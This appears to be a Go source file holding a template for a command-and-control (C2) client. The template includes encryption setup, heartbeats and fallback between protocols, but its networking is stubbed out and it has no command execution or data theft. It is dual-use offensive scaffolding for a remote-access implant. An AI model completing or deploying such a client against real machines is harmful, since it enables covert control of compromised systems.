package main

const clientTemplate = `package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"
	
	"client/pkg/crypto"
	"client/pkg/protocol"
)

var (
	serverAddr      string
	protocolList    string
	currentProtocol string
	encryptor       crypto.Encryptor
	protocolHandler *protocol.ProtocolHandler
	sessionID       crypto.SessionID
	connMutex       sync.Mutex
	isConnected     bool
	lastHeartbeat   time.Time
)

func main() {
	// Parse command line flags
	flag.StringVar(&serverAddr, "server", BuildConfig.ServerAddr, "C2 server address")
	flag.StringVar(&protocolList, "protocol", strings.Join(BuildConfig.Protocols, ","), "Comma-separated list of protocols to use")
	flag.Parse()

	if serverAddr == "" {
		fmt.Println("Error: Server address is required")
		flag.Usage()
		os.Exit(1)
	}

	// Parse protocol list
	protocols := strings.Split(protocolList, ",")
	if len(protocols) == 0 {
		fmt.Println("Error: At least one valid protocol must be specified")
		flag.Usage()
		os.Exit(1)
	}

	// Initialize encryption
	var err error
	
	if BuildConfig.EncryptionAlg == "aes" {
		encryptor, err = crypto.NewAESEncryptor()
	} else if BuildConfig.EncryptionAlg == "chacha20" {
		encryptor, err = crypto.NewChacha20Encryptor()
	} else {
		log.Fatalf("Unsupported encryption algorithm: %s", BuildConfig.EncryptionAlg)
	}
	
	if err != nil {
		log.Fatalf("Failed to initialize encryption: %v", err)
	}

	// Initialize protocol handler
	protocolHandler = protocol.NewProtocolHandler()
	sessionID = crypto.GenerateSessionID()
	
	// Setup signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	// Start with the first protocol
	currentProtocol = protocols[0]
	
	// Connect to server
	if err := connect(currentProtocol, serverAddr); err != nil {
		log.Printf("Failed to connect with protocol %s: %v", currentProtocol, err)
		
		// Try other protocols if available
		if len(protocols) > 1 && BuildConfig.ActiveSwitching {
			for i := 1; i < len(protocols); i++ {
				currentProtocol = protocols[i]
				if err := connect(currentProtocol, serverAddr); err == nil {
					break
				}
				log.Printf("Failed to connect with protocol %s: %v", currentProtocol, err)
			}
		}
	}
	
	if !isConnected {
		log.Fatalf("Failed to connect to server with any protocol")
	}

	// Start heartbeat
	go sendHeartbeats()
	
	// Start protocol switching monitor if active switching is enabled
	if BuildConfig.ActiveSwitching && len(protocols) > 1 {
		go monitorConnection(protocols)
	}

	// Wait for termination signal
	<-sigChan
	fmt.Println("\nShutting down client...")
	
	// Perform clean shutdown
	disconnect()
	
	fmt.Println("Client shutdown complete.")
}

func connect(protocol, address string) error {
	connMutex.Lock()
	defer connMutex.Unlock()
	
	// Implementation would connect using the specified protocol
	log.Printf("Connecting to %s using protocol %s", address, protocol)
	
	// Create a key exchange packet
	keyExchangePacket := createPacket(5, []byte(string(sessionID))) // 5 = PacketTypeKeyExchange
	
	// Encrypt and send the packet
	// This is a placeholder for the actual implementation
	_, _ = encryptPacket(keyExchangePacket) // Prevent unused variable warning
	
	// Simulate connection
	time.Sleep(500 * time.Millisecond)
	
	// Update connection state
	isConnected = true
	lastHeartbeat = time.Now()
	
	log.Printf("Connected to server: %s using protocol: %s with encryption: %s", 
		address, protocol, BuildConfig.EncryptionAlg)
	return nil
}

func disconnect() {
	connMutex.Lock()
	defer connMutex.Unlock()
	
	if !isConnected {
		return
	}
	
	// Implementation would disconnect from the server
	log.Println("Disconnecting from server")
	
	// Update connection state
	isConnected = false
}

func sendHeartbeats() {
	for {
		time.Sleep(time.Duration(BuildConfig.HeartbeatInterval) * time.Second)
		
		connMutex.Lock()
		if !isConnected {
			connMutex.Unlock()
			continue
		}
		
	// Create and send heartbeat packet
	heartbeatPacket := createPacket(0, []byte("heartbeat")) // 0 = PacketTypeHeartbeat
	
	// Implementation would encrypt and send the packet
	_, _ = encryptPacket(heartbeatPacket) // Prevent unused variable warning
	log.Println("Sending heartbeat with encryption algorithm:", BuildConfig.EncryptionAlg)
		
		// Update last heartbeat time
		lastHeartbeat = time.Now()
		connMutex.Unlock()
	}
}

func monitorConnection(protocols []string) {
	currentProtocolIndex := 0
	for i, p := range protocols {
		if p == currentProtocol {
			currentProtocolIndex = i
			break
		}
	}
	
	for {
		time.Sleep(5 * time.Second)
		
		connMutex.Lock()
		if !isConnected || time.Since(lastHeartbeat) > time.Duration(BuildConfig.HeartbeatInterval*3)*time.Second {
			// Connection lost or heartbeat timeout, try next protocol
			nextIndex := (currentProtocolIndex + 1) % len(protocols)
			nextProtocol := protocols[nextIndex]
			
			log.Printf("Switching from protocol %s to %s", currentProtocol, nextProtocol)
			
			// Disconnect if still connected
			if isConnected {
				// Implementation would disconnect
				isConnected = false
			}
			
			connMutex.Unlock()
			
			// Try to connect with next protocol
			if err := connect(nextProtocol, serverAddr); err != nil {
				log.Printf("Failed to connect with protocol %s: %v", nextProtocol, err)
			} else {
				currentProtocol = nextProtocol
				currentProtocolIndex = nextIndex
			}
		} else {
			connMutex.Unlock()
		}
	}
}

// createPacket creates a new packet with the specified type and data
func createPacket(packetType uint8, data []byte) *protocol.Packet {
	packet := protocol.NewPacket(protocol.PacketType(packetType), data)
	
	// Set encryption algorithm based on BuildConfig
	var encAlg protocol.EncryptionAlgorithm
	if BuildConfig.EncryptionAlg == "aes" {
		encAlg = protocol.EncryptionAlgorithmAES
	} else if BuildConfig.EncryptionAlg == "chacha20" {
		encAlg = protocol.EncryptionAlgorithmChacha20
	}
	
	packet.SetEncryptionAlgorithm(encAlg)
	return packet
}

// encryptPacket encrypts a packet using the current encryptor
func encryptPacket(packet *protocol.Packet) ([]byte, error) {
	// Encode the packet
	encoded := packet.Encode()
	
	// Encrypt the encoded packet
	encrypted, err := encryptor.Encrypt(encoded)
	if err != nil {
		return nil, err
	}
	
	return encrypted, nil
}
`
